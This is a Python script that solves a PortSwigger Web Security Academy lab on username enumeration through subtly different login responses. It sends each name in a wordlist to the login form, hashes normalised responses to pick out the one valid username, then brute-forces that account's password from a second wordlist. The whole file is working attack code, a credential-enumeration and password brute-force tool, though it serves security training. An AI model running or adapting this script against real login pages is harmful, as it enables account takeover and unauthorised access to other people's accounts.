# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses


import requests
import hashlib
import re
from collections import defaultdict 


with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()


url = 'https://....web-security-academy.net/login'
resp_hash_to_usernames = defaultdict(list)
found_username = ''
found_password = ''


for username in usernames:
    login_body = {
        'username': username,
        'password': 'lol'
    }
    r = requests.post(url = url, data = login_body)
    resp_text = re.sub(r"(?<=/analytics\?id=)\d+", '', r.text)
    resp_text = re.sub(r"<body>.*?<script>", '', resp_text, flags = re.DOTALL)
    resp_hash = hashlib.md5(resp_text.encode()).hexdigest()
    resp_hash_to_usernames[resp_hash].append(username)

found_username = next(usernames[0] for resp_hash, usernames in resp_hash_to_usernames.items() if len(usernames) == 1)

print('Username: ', found_username)


for password in passwords:
    login_body = {
        'username': found_username,
        'password': password
    }
    r = requests.post(url = url, data = login_body)
    if 'Invalid' not in r.text:
        found_password = password
        break

print('Password: ', found_password)
